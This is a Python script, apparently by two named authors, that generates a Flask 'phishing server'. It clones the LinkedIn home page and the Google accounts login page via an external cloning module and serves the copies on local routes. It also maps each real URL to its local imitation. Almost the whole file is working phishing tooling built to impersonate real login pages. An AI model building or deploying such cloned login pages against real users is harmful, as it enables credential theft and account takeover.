import PDFProcessor
import Clone as Builder

dict={}


Links=['https://www.linkedin.com/home/?originalSubdomain=il','https://accounts.google.com/']



i=1


def BuildServer (Links):
    global i
    
    Header="""from flask import render_template\n
from flask import Flask, render_template,request \n
app=Flask(__name__)\n

    """



    Basic="""
@app.route('/')
def indexREPLACEME():\n
    return "welcome kareem and mohaamed's phishing server "\n
    """

    NewRoute="""
@app.route('/REPLACEME')
def indexREPLACEME():\n
    return render_template("REPLACEME.html")\n
    """

    memoryvar=NewRoute

    End="""
if __name__ == '__main__':\n
    app.run( port=8080 ,debug=True)

    """
    f = open("app.py", "w")
    f.write(Header)
    f.write(Basic)
    


    for link in Links:
        NewFileName=str(i)+'.html'
        dict[link]='http://localhost:8080/'+NewFileName
        Builder.Clone(link,NewFileName)
        NewRoute=NewRoute.replace('REPLACEME', str(i), 3)
        f.write(NewRoute)
        NewRoute=memoryvar
        i+=1

    f.write(End)
    f.close()
    print('Server file was built at app.py')

BuildServer(Links)

